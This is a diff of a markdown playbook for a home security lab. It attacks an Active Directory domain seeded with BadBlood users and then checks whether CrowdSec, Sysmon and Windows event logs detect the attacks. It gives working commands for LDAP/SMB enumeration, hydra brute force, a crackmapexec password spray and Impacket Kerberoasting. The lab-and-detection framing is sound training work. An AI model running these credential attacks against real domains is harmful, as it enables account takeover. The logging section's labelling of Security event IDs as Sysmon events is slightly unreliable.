@@ -1,20 +1,20 @@
 # Active Directory Attack Playbook (Using BadBlood Users)
 
-## 🛠️ **Lab Setup Overview**
+## **Overview**
 
-- **Target:** Active Directory Server (e.g., Windows Server 2022)
-  - IP Address: `192.168.10.50`
+- **Target:** Active Directory Server: Windows Server 2022 Datacenter Evaluation
+  - IP Address: `192.168.10.10`
   - Domain: `soclab.local`
   - Vulnerable Users: Populated by **BadBlood**
 
-- **Attacker:** Kali Linux (e.g., 2024 Edition)
+- **Attacker:** Kali Linux
   - IP Address: `192.168.20.30`
 
-- **Network:** Both machines are connected and pass through **pfSense** for monitoring and CrowdSec integration.
+- **Network architecture:** Both machines are connected and go through **pfSense** for monitoring and CrowdSec integration, but in different subnet.
 
 ---
 
-## 📊 **1. Identify BadBlood Users**
+## **1. Identify BadBlood Users**
 
 ### From the Active Directory Server:
 
@@ -32,11 +32,11 @@ Enumerate users via LDAP (replace values accordingly):
 ldapsearch -x -h 192.168.10.50 -D "user@soclab.local" -W -b "dc=soclab,dc=local"
 ```
 
-✅ **Objective:** Identify target users with weak or known passwords.
+**Objective:** Identify target users with weak or known passwords.
 
 ---
 
-## 🔍 **2. Enumerate Active Directory (LDAP/SMB)**
+## **2. Enumerate Active Directory (LDAP/SMB)**
 
 ### Using **enum4linux**
 
@@ -56,11 +56,11 @@ List available users:
 querydispinfo
 ```
 
-✅ **Objective:** Gather information about domain users, shares, and policies.
+**Objective:** Gather information about domain users, shares, and policies.
 
 ---
 
-## 🔑 **3. Brute-Force AD Accounts**
+## **3. Brute-Force AD Accounts**
 
 ### SMB Brute-Force (Weak Passwords)
 
@@ -74,11 +74,11 @@ hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.t
 hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt ldap://192.168.10.50
 ```
 
-✅ **Objective:** Identify vulnerable accounts with weak passwords.
+**Objective:** Identify vulnerable accounts with weak passwords.
 
 ---
 
-## 📜 **4. Password Spray Attack**
+## **4. Password Spray Attack**
 
 Simulate a slow password spray (avoid account lockout):
 
@@ -86,11 +86,11 @@ Simulate a slow password spray (avoid account lockout):
 crackmapexec smb 192.168.10.50 -u /usr/share/wordlists/common_users.txt -p Welcome2024
 ```
 
-✅ **Objective:** Detect users with predictable passwords without triggering lockout.
+**Objective:** Detect users with predictable passwords without triggering lockout.
 
 ---
 
-## 🎭 **5. Kerberoasting Attack (Steal Service Account Hashes)**
+## **5. Kerberoasting Attack (Steal Service Account Hashes)**
 
 Ensure **Impacket** is installed:
 
@@ -104,11 +104,11 @@ Run the **Kerberoasting** attack:
 GetUserSPNs.py soclab.local/user:Password123 -request
 ```
 
-✅ **Objective:** Extract service account hashes for offline cracking.
+**Objective:** Extract service account hashes for offline cracking.
 
 ---
 
-## 📊 **6. Analyze Detection (CrowdSec + Sysmon + Windows Event Logs)**
+## **6. Analyze Detection (CrowdSec + Sysmon + Windows Event Logs)**
 
 1. **Sysmon (Windows)**:
     - Event ID **4625**: Failed Logon Attempts
@@ -125,15 +125,14 @@ GetUserSPNs.py soclab.local/user:Password123 -request
 3. **Windows Event Viewer**:
     - Security > Audit Failure (Event ID 4625, 4740)
 
-✅ **Objective:** Confirm detection and analyze attack visibility.
+**Objective:** Confirm detection and analyze attack visibility.
 
 ---
 
-## 🚀 **7. Next Steps**
+## **7. Next Steps**
 
 - Perform **Lateral Movement** (e.g., **Pass-the-Hash**).
 - Test **LDAP Injection** and privilege escalation.
 - Monitor logs for **CrowdSec bans** and firewall blocks.
 
-Do you want to dive deeper into a specific attack or monitor additional logs?
 
